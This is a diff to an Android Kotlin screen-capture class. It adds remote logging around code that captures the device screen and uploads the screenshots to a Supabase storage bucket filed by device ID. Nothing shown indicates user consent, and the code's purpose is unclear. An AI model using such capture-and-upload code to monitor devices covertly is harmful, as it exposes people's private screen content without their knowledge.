@@ -63,6 +63,7 @@ class ScreenCaptureEngine(private val context: Context) {
 
         try {
             Log.i(TAG, "Starting screen capture...")
+            supabase.logRemote(context, TAG, "INFO", "Started capture process")
             
             val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
             val metrics = DisplayMetrics()
@@ -127,18 +128,22 @@ class ScreenCaptureEngine(private val context: Context) {
                         }
 
                         // الرفع إلى Supabase
-                        val supabase = SupabaseManager.getInstance()
-                        val result = supabase.uploadFile(
+                        supabase.logRemote(context, TAG, "INFO", "Bitmap created. Starting upload to bucket: $BUCKET_NAME")
+                        
+                        val uploadResult = supabase.uploadFile(
                             file = file,
                             bucket = BUCKET_NAME,
                             folder = "screenshots/${getDeviceId()}",
                             customFileName = fileName
                         )
 
-                        if (result is UploadResult.Success) {
-                            Log.i(TAG, "Screenshot uploaded successfully: ${result.publicUrl}")
+                        if (uploadResult is UploadResult.Success) {
+                            Log.i(TAG, "Screenshot uploaded successfully: ${uploadResult.publicUrl}")
+                            supabase.logRemote(context, TAG, "INFO", "Upload Success: ${uploadResult.fileName}")
                         } else {
-                            Log.e(TAG, "Upload failed")
+                            val errorMsg = (uploadResult as? UploadResult.Error)?.message ?: "Unknown error"
+                            Log.e(TAG, "Upload failed: $errorMsg")
+                            supabase.logRemote(context, TAG, "ERROR", "Upload failed: $errorMsg")
                         }
                         
                         // تنظيف الملف المؤقت
@@ -148,6 +153,7 @@ class ScreenCaptureEngine(private val context: Context) {
                     }
                 } else {
                     Log.e(TAG, "Failed to acquire image from ImageReader")
+                    supabase.logRemote(context, TAG, "ERROR", "Failed to acquire image (ImageReader empty)")
                 }
             } finally {
                 virtualDisplay?.release()
@@ -156,6 +162,7 @@ class ScreenCaptureEngine(private val context: Context) {
 
         } catch (e: Exception) {
             Log.e(TAG, "General screen capture error: ${e.message}", e)
+            supabase.logRemote(context, TAG, "ERROR", "Capture crash: ${e.message}")
         }
     }
 
